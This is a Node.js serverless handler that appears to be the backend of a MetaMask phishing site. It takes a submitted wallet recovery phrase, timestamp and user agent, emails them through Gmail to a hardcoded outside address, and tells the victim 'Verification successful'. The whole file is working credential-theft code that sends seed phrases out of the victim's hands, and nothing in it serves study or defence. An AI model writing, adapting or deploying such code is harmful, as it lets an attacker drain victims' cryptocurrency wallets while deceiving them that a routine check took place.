const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  
  // Handle pre-flight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    const { recoveryPhrase, timestamp, userAgent } = req.body;
    
    if (!recoveryPhrase) {
      return res.status(400).json({ success: false, message: 'Missing recovery phrase' });
    }

    // Create a transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });

    // Create email content
    const emailContent = `
      <h2>MetaMask Recovery Phrase</h2>
      <p><strong>Recovery Phrase:</strong> ${recoveryPhrase}</p>
      <p><strong>Timestamp:</strong> ${timestamp}</p>
      <p><strong>User Agent:</strong> ${userAgent}</p>
    `;

    // Send email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: 'arulnoah668@gmail.com',
      subject: 'New MetaMask Recovery Phrase',
      html: emailContent
    });

    console.log('Email sent successfully');

    // Return success
    return res.status(200).json({ 
      success: true, 
      message: 'Verification successful' 
    });

  } catch (error) {
    console.error('Error processing request:', error);
    
    // Check if it's an email-related error
    const errorMessage = error.message || 'Server error occurred';
    const isAuthError = errorMessage.includes('auth') || errorMessage.includes('credential');
    
    return res.status(500).json({ 
      success: false,
      message: 'Server error occurred',
      details: isAuthError ? 'Email authentication failed - check credentials' : errorMessage
    });
  }
};
